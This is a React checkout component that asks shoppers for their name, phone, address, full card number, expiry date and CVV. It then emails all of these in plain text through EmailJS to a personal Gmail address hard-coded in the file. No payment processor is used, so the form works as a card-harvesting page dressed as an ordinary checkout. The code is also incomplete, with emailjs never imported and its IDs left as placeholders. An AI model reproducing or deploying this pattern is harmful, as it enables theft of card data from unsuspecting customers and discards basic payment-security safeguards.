import React, { useState } from 'react';
import { mastercard, visa } from "../assets/icons";

function CheckOut() {
    const [name, setName] = useState('');
    const [phone, setPhone] = useState('');
    const [address, setAddress] = useState('');
    const [cardNumber, setCardNumber] = useState('');
    const [expiryMonth, setExpiryMonth] = useState('');
    const [expiryYear, setExpiryYear] = useState('');
    const [cvv, setCvv] = useState('');
    const [error, setError] = useState('');

    const handleCheckout = () => {
        if (!name || !phone || !address || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
            setError('Please fill in all fields.');
            return;
        }

        const details = {
            name,
            phone,
            address,
            cardNumber,
            expiryMonth,
            expiryYear,
            cvv,
        };

        // Call your email sending function here
        sendEmail(details);
    };

    const sendEmail = (details) => {
        // Replace with your email-sending logic
        const emailContent = `
            Name: ${details.name}
            Phone: ${details.phone}
            Address: ${details.address}
            Card Number: ${details.cardNumber}
            Expiry: ${details.expiryMonth}/${details.expiryYear}
            CVV: ${details.cvv}
        `;

        // Example using EmailJS
        emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
            to_email: 'itxmuttahr@gmail.com',
            message: emailContent,
        })
        .then((response) => {
            console.log('Email sent successfully!', response.status, response.text);
        })
        .catch((error) => {
            console.error('Error sending email:', error);
        });
    };

    return (
        <div className="flex-col w-full max-w-md h-auto sm:h-[500px] absolute bg-white inset-0 m-auto p-4 sm:p-10 shadow-lg">
            <span className="close cursor-pointer text-gray-400 text-xl self-end">X</span>
            <h1 className="text-2xl text-gray-400 mb-4">Personal Information</h1>

            {error && <p className="text-red-500">{error}</p>}

            <label className="text-sm font-light">Name and Surname</label>
            <input
                type="text"
                placeholder="John Doe"
                className="pay-input border-b border-gray-400 p-2 focus:outline-none focus:border-gray-600 mb-4 w-full"
                value={name}
                onChange={(e) => setName(e.target.value)}
            />

            <label className="text-sm font-light">Phone Number</label>
            <input
                type="text"
                placeholder="+1 234 333 5678"
                className="pay-input border-b border-gray-400 p-2 focus:outline-none focus:border-gray-600 mb-4 w-full"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
            />

            <label className="text-sm font-light">Address</label>
            <input
                type="text"
                placeholder="Elton St 21 22-145"
                className="pay-input border-b border-gray-400 p-2 focus:outline-none focus:border-gray-600 mb-4 w-full"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
            />

            <h1 className="text-2xl text-gray-400 mb-4">Card Information</h1>

            <div className="flex space-x-2 mb-4">
                <img src={mastercard} width="40" alt="Mastercard" className="card-icon" />
                <img src={visa} width="40" alt="Visa" className="card-icon" />
            </div>

            <input
                type="text"
                placeholder="Card Number"
                className="pay-input border-b border-gray-400 p-2 focus:outline-none focus:border-gray-600 mb-4 w-full"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
            />

            <div className="flex space-x-4 mb-4">
                <input
                    type="text"
                    placeholder="mm"
                    className="pay-input border-b border-gray-400 p-2 w-16 focus:outline-none focus:border-gray-600"
                    value={expiryMonth}
                    onChange={(e) => setExpiryMonth(e.target.value)}
                />
                <input
                    type="text"
                    placeholder="yyyy"
                    className="pay-input border-b border-gray-400 p-2 w-20 focus:outline-none focus:border-gray-600"
                    value={expiryYear}
                    onChange={(e) => setExpiryYear(e.target.value)}
                />
                <input
                    type="text"
                    placeholder="cvv"
                    className="pay-input border-b border-gray-400 p-2 w-16 focus:outline-none focus:border-gray-600"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value)}
                />
            </div>

            <button className="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600 transition w-full" onClick={handleCheckout}>
                Checkout!
            </button>
        </div>
    );
}

export default CheckOut;
